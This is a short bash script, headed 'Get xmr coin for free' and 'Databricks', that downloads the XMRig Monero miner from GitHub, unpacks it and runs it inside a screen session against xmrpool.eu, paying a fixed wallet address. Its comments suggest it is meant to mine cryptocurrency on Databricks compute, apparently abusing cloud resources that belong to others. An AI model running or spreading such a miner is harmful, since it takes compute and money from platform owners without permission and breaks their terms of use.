#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xvzf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./xmrig -o xmrpool.eu:9999 -u 4AHyuanba9aN9MWY5BWFueWNP8NavRRNpc69ZmizjMeKFYE3rMpsmZn4ryPsF5f6w16bPFwGbjzB77pc4XQcHqQ2HmFUVdE+CPU3 -k --tls
